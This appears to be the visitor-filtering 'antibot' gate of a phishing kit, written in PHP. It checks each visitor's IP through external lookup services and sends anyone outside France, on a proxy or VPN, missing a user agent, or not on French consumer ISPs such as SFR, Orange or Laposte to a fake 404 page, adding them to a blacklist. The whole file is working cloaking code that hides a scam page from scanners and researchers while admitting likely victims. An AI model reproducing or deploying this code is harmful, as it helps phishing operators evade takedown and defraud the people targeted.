<?php
if (!isset($_SERVER['REMOTE_ADDR'])) {
    header('location: 404.html');
    exit;
}
$ip_address = $_SERVER['REMOTE_ADDR'];
$ip_details = json_decode(file_get_contents('http://ip-api.com/json/' . $ip_address));
$providers = ['SFR', 'Bouygues', 'Orange', 'Free', 'Sosh', 'Numericable', 'Laposte'];
$blacklist = explode("\n", file_get_contents('blacklist.txt'));
if (!isset($_SERVER['HTTP_USER_AGENT'])) {
    $blacklist[] = $ip_address;
    file_put_contents('blacklist.txt', implode("\n", $blacklist));
    header('location: 404.html');
    exit;
}
if (in_array($ip_address, $blacklist)) {
    header('location: 404.html');
    exit;
}
if (file_get_contents('https://blackbox.ipinfo.app/lookup/' . $ip_address) == 'Y') {
    $blacklist[] = $ip_address;
    file_put_contents('blacklist.txt', implode("\n", $blacklist));
    header('location: 404.html');
    exit;
}
if ($ip_details->country != 'France') {
    $blacklist[] = $ip_address;
    file_put_contents('blacklist.txt', implode("\n", $blacklist));
    header('location: 404.html');
    exit;
}
$match = 0;
foreach ($providers as $provider) {
    if (stripos($ip_details->isp, $provider) !== false || stripos($ip_details->as, $provider) !== false || stripos($ip_details->org, $provider) !== false) {
        $match = 1;
    }
}
if (!$match) {
    $blacklist[] = $ip_address;
    file_put_contents('blacklist.txt', implode("\n", $blacklist));
    header('location: 404.html');
    exit;
}
